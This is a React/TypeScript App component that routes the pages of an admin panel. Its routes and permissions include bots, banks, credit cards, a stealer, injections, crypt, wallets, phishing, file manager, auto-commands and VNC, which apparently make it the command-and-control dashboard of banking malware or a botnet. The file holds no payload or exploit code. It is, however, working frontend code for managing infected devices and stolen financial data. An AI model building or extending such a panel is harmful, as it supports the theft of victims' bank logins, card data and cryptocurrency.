import React, {useCallback, useLayoutEffect, useState} from "react";
import {BrowserRouter as Router, Navigate, Route, Routes} from "react-router-dom";
import Sidebar from "./Layout/Sidebar/Sidebar";
import {BackTop, Button, ConfigProvider, Layout} from "antd";
import LoginPage from "./Components/Pages/Login/LoginPage";
import Bots from "./Components/Pages/Bots/Bots";
import {AppState} from "./Store/RootReducer";
import {authorizeCheck} from "./Store/Auth/Actions";
import {getJwtToken, panelName} from "./Util/config";
import Users from "./Components/Pages/Users/Users";
import Banks from "./Components/Pages/Banks/Banks";
import "swiper/css";
import "swiper/css/pagination";
import "antd/dist/antd.dark.css";
import "leaflet/dist/leaflet.css";
import "./Assets/Styles/styles.scss";
import "react-phone-number-input/style.css";
import Stealer from "./Components/Pages/Stealer/Stealer";
import Injections from "./Components/Pages/Injections/Injections";
import Crypt from "./Components/Pages/Crypt/Crypt";
import Email from "./Components/Pages/Email/Email";
import Shops from "./Components/Pages/Shops/Shops";
import Wallet from "./Components/Pages/Wallet/Wallet";
import Permissions from "./Components/Pages/Permissions/Permissions";
import GeneralStats from "./Components/Pages/GeneralStats/GeneralStats";
import {ArrowUpOutlined} from "@ant-design/icons";
import {getFiltersList} from "./Store/Filters/Actions";
import {hasAccess} from "./Util/hasAccess";
import {getCountsList} from "./Store/Counts/Actions";
import useInterval from "./Hook/useInterval";
import HeaderLayout from "./Layout/Header/Header";
import Cards from "./Components/Pages/Cards/Cards";
import NotFound from "./Components/Pages/NotFound/NotFound";
import SearchResults from "./Components/Pages/SearchResults/SearchResults";
import SmartInjections from "./Components/Pages/SmartInjections/SmartInjections";
import {useTranslation} from "react-i18next";
import FileManager from "./Components/Pages/FileMaganer/FileManager";
import Spinner from "./Components/Misc/Spinner";
import AutoCommands from "./Components/Pages/AutoCommands/AutoCommands";
import Fishing from "./Components/Pages/Fishing/Fishing";
import {getHeaderStatsList} from "./Store/HeaderStats/Actions";
import VNC from "./Components/Pages/VNC/VNC";
import {useAppDispatch} from "./Hook/useAppDispatch";
import {useAppSelector} from "./Hook/useAppSelector";

const {Content, Footer} = Layout;

const App: React.FC = () => {
    useLayoutEffect(() => {
        const container = document.getElementById("bootloader");

        if (container) {
            setTimeout(() => container.parentNode?.removeChild(container), 500);
        }
    });

    const authReducer = useAppSelector((state: AppState) => state.auth);

    const dispatch = useAppDispatch();

    const getFilters = useCallback(() => {
        dispatch(getFiltersList());
    }, [dispatch]);

    const getCounts = useCallback(() => {
        dispatch(getCountsList());
    }, [dispatch]);

    const getHeaderStats = useCallback(() => {
        dispatch(getHeaderStatsList());
    }, [dispatch]);

    useLayoutEffect(() => {
        dispatch(authorizeCheck(getJwtToken()));
    }, [dispatch]);

    const settingsReducer = useAppSelector((state: AppState) => state.settings);

    useLayoutEffect(() => {
        if (settingsReducer.theme === "light") {
            document.getElementsByTagName("body")[0].classList.add("light-theme");
        } else {
            document.getElementsByTagName("body")[0].classList.remove("light-theme");
        }
    }, [dispatch, settingsReducer.theme]);

    useLayoutEffect(() => {
        if (authReducer.isAuthorized) {
            getCounts();
            getFilters();
            getHeaderStats();
        }
    }, [authReducer.isAuthorized, dispatch, getCounts, getFilters]);

    useInterval(() => {
        if (authReducer.isAuthorized) {
            getFilters();
        }
    }, 60000);

    useInterval(() => {
        if (authReducer.isAuthorized) {
            getCounts();
            getHeaderStats();
        }
    }, 20000);

    const [collapsedMenu, setCollapsedMenu] = React.useState(false);
    const {t} = useTranslation();

    const toggleCollapsedMenu = () => {
        const bodyEl: HTMLBodyElement = document.getElementsByTagName("body")[0];
        setCollapsedMenu(!collapsedMenu);
        bodyEl?.classList.toggle("on-menu");

        window.scrollTo(0, 0);
    };

    const [showSearchMenu, setShowSearchMenu] = useState(false);

    if (!authReducer.isLoaded) {
        return (
            <div className="app-loader">
                <div className="app-loader-inner">
                    <Spinner
                        size={48}
                        variant="circle"
                        title={t("LOADING")}
                    />
                </div>
            </div>
        );
    }

    if (!authReducer.isAuthorized) {
        return <LoginPage/>;
    }

    const user = authReducer.user;

    return authReducer.isAuthorized ? (
        <ConfigProvider>
            <Router>
                <Layout style={{minHeight: "100vh"}}>
                    <Sidebar collapsedState={collapsedMenu} collapseAction={toggleCollapsedMenu}/>

                    <Layout className="site-layout">
                        <HeaderLayout
                            collapseAction={toggleCollapsedMenu}
                            collapsedState={collapsedMenu}
                            search={showSearchMenu}
                            setSearch={setShowSearchMenu}
                        />

                        <Content style={{padding: "0 15px"}}>
                            <div className="site-layout-background">
                                <Routes>
                                    <Route path='*' element={<NotFound/>}/>

                                    {hasAccess(user, "bots.list") && (
                                        <>
                                            <Route path="/" element={<Navigate to="/bots"/>}/>
                                            <Route path="/bots" element={<Bots renderType="cards" type="all"/>}/>
                                            <Route path="/favourites"
                                                element={<Bots renderType="cards" type="favourites"/>}/>
                                            <Route path="/permissionless"
                                                element={<Bots renderType="cards" type="permissionless"/>}/>
                                            <Route path="/online" element={<Bots renderType="cards" type="online"/>}/>
                                            <Route path="/offline" element={<Bots renderType="cards" type="offline"/>}/>
                                            <Route path="/uninstalled"
                                                element={<Bots renderType="cards" type="uninstalled"/>}/>
                                        </>
                                    )}
                                    {hasAccess(user, "banks.list") && (
                                        <Route path="/banks" element={<Banks/>}/>
                                    )}
                                    {hasAccess(user, "credit_cards.list") && (
                                        <Route path="/cards" element={<Cards/>}/>
                                    )}

                                    {hasAccess(user, "stealers.list") && (
                                        <Route path="/stealer" element={<Stealer/>}/>
                                    )}

                                    {hasAccess(user, "injections.list") && (
                                        <Route path="/injections" element={<Injections/>}/>
                                    )}

                                    {hasAccess(user, "injections.list") && (
                                        <Route path="/smartInjections" element={<SmartInjections/>}/>
                                    )}

                                    {hasAccess(user, "crypt.list") && (

                                        <Route path="/crypt" element={<Crypt/>}/>
                                    )}

                                    {hasAccess(user, "emails.list") && (

                                        <Route path="/email" element={<Email/>}/>
                                    )}

                                    {hasAccess(user, "shops.list") && (

                                        <Route path="/shops" element={<Shops/>}/>
                                    )}

                                    {hasAccess(user, "wallets.list") && (

                                        <Route path="/wallet" element={<Wallet/>}/>
                                    )}

                                    {hasAccess(user, "permissions.list") && (

                                        <Route path="/permissions" element={<Permissions/>}/>
                                    )}

                                    {hasAccess(user, "stats.list") && (

                                        <Route path="/stats" element={<GeneralStats/>}/>
                                    )}

                                    {hasAccess(user, "users.list") && (

                                        <Route path="/users" element={<Users/>}/>
                                    )}

                                    <Route path="filemanager" element={<FileManager/>}/>

                                    <Route path="autocommands" element={<AutoCommands/>}/>

                                    <Route path="fishing" element={<Fishing/>}/>

                                    <Route path="/vnc" element={<VNC/>}/>

                                    <Route
                                        path="/search"
                                        element={<SearchResults search={showSearchMenu} setSearch={setShowSearchMenu}/>}
                                    />
                                </Routes>
                            </div>
                        </Content>

                        <Footer style={{textAlign: "center", color: "rgba(180,180,180, .7)"}}>
                            # {panelName} #
                        </Footer>
                    </Layout>


                    <BackTop>
                        <Button size="large" shape="circle" type="primary" icon={<ArrowUpOutlined/>}/>
                    </BackTop>

                    <div
                        className={collapsedMenu ? "layout-overlay active" : "layout-overlay"}
                        onClick={toggleCollapsedMenu}
                    />
                </Layout>
            </Router>
        </ConfigProvider>

    ) : (
        <Router>
            <Routes>
                <Route path="/" element={<LoginPage/>}/>
            </Routes>
        </Router>
    );
};

export default App;
